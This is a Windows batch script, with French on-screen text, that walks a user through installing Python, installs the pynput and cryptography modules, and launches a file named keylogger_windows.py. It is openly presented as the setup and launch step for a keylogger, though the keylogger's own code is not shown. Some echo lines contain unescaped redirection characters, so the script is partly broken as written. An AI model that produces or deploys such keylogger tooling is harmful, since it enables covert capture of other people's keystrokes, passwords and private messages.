@echo off
title Installation Keylogger (Etape Manuelle)
color 0E

echo.
echo ========================================================
echo      ETAPE 1 : INSTALLATION MANUELLE DE PYTHON
echo ========================================================
echo.
echo [ATTENTION] Le script a besoin de Python 3.11.
echo.
echo 1. Telechargez Python :
echo    (Le navigateur va s'ouvrir)
start https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe

echo.
echo 2. Executez l'installateur telecharge.
echo    >>>> CRITIQUE : COCHEZ "Add Python to PATH" <<<<
echo.
echo 3. Appuyez sur une touche ICI pour continuer apres l'installation.
pause >nul
cls

:: ========================================================
:: 2. INSTALLATION DES DEPENDANCES ET LANCEMENT
:: ========================================================
color 0A
echo ========================================================
echo      ETAPE 2 : INSTALLATION ET LANCEMENT
echo ========================================================

python --version >nul 2>&1
if %errorlevel% neq 0 (
    color 0C
    echo [ERREUR] Python n'est toujours pas detecte. Verifiez votre installation.
    pause
    exit
)

echo [OK] Python est pret.
echo [ACTION] Installation des modules (pynput)...
pip install pynput cryptography

if %errorlevel% equ 0 (
    echo [SUCCES] Modules installes.
    echo.
    echo [LANCEMENT] Demarrage du Keylogger...
    echo.
    echo    >>> FERMEZ CETTE FENETRE POUR ARRETER LE KEYLOGGER <<<
    echo.
    python keylogger_windows.py
) else (
    color 0C
    echo [ERREUR CRITIQUE] Echec de l'installation de Pynput.
)

pause
